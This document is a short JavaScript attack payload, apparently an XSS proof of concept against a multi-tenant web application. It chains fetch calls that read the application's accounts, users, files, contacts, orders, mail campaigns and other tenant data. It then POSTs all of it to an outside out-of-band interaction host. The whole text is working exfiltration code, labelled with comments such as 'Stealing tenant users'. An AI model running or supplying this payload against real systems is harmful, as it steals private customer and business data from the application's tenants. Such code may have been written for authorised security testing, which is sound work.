// Stealing tenant clients
fetch("/api/v2/accounts/")
  .then(res => res.text())
  .then(data1 => {

    // Stealing tenant notifications
    fetch("/api/v2/2000006/notifications")
      .then(res => res.text())
      .then(data2 => {

        // Stealing tenant files
        fetch("/api/v2/files")
          .then(res => res.text())
          .then(data3 => {

            // Stealing tenant users
            fetch("/api/v2/users/all")
              .then(res => res.text())
              .then(data4 => {

                // Stealing tenant forms
                fetch("/api/v2/forms")
                  .then(res => res.text())
                  .then(data5 => {

                    // Stealing tenant projects
                    fetch("/api/v2/2000006/projects")
                      .then(res => res.text())
                      .then(data6 => {

                        // Stealing tenant contacts
                        fetch("/api/v2/contacts")
                          .then(res => res.text())
                          .then(data7 => {

                            // Stealing tenant mailCampaigns
                            fetch("/api/v2/mailCampaigns")
                              .then(res => res.text())
                              .then(data8 => {

                                // Stealing tenant orders
                                fetch("/api/v2/orders/")
                                  .then(res => res.text())
                                  .then(data9 => {

                                    // Send all to oast.site
                                    fetch("https://uubirxqghuxrazhbdlhl8v0qf1ujj2wkh.oast.fun", {
                                      method: "POST",
                                      mode: "no-cors",
                                      body: JSON.stringify({
                                        accounts: data1,
                                        notifications: data2,
                                        files: data3,
                                        users: data4,
                                        forms: data5,
                                        projects: data6,
                                        contacts: data7,
                                        mailCampaigns: data8,
                                        orders: data9
                                      })
                                    });

                                  });

                              });

                          });

                      });

                  });

              });

          });

      });

  });
